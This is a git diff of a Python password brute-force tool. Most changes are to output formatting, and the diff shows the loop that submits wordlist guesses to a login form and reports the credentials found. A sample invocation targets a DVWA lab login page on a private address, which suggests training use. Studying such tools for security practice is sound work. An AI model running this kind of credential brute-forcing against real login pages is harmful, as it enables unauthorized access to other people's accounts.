@@ -168,14 +168,15 @@ class BruteForce:
             return
         response = brute_force_request(self.url, data=data, timeout=5)
         if self.verification in response.content.decode('utf-8'):
-            if self.verbose is None:
-                print(colored(f'\r[-] Working On {number}\t\tPassword Invalid "{word}"\n', 'red'), end='')
+            if self.verbose is not None:
+                print(colored(f'\rWorking On {number}\t\tPassword Invalid "{word}"\n'), end='')
+            else:
                 pass
         else:
-            self.creds_found = True
-            print(colored(f'[+] Working On {number}\t\tPassword Found "{word}"', 'green'))
             self.end = time.time()
-            print(f"[*] Total time - {self.end - self.start} seconds.")
+            print(f'\rWorking On {number}\t\tPassword Found "{word}"\n', end='')
+            print(colored(f"\r[*] Total time - {self.end - self.start} seconds.\n", 'yellow'), end='')
+            self.creds_found = True
             time.sleep(3)
             print("\n\n")
             print(colored(f"Credentials for ", 'blue') + colored(f"{self.url}\n", 'green') +
@@ -227,7 +228,7 @@ class BruteForce:
 
 
 if __name__ == '__main__':
-    fix_color_output()
+    fix_color_output()  # Fix Color Output in windows/linux.
     BruteForce().main()
     """
     -l admin -p "../../../Wordlist/passwords1.txt" -u "http://192.168.56.101/dvwa/login.php" -t 15 -y "Login  failed" -v
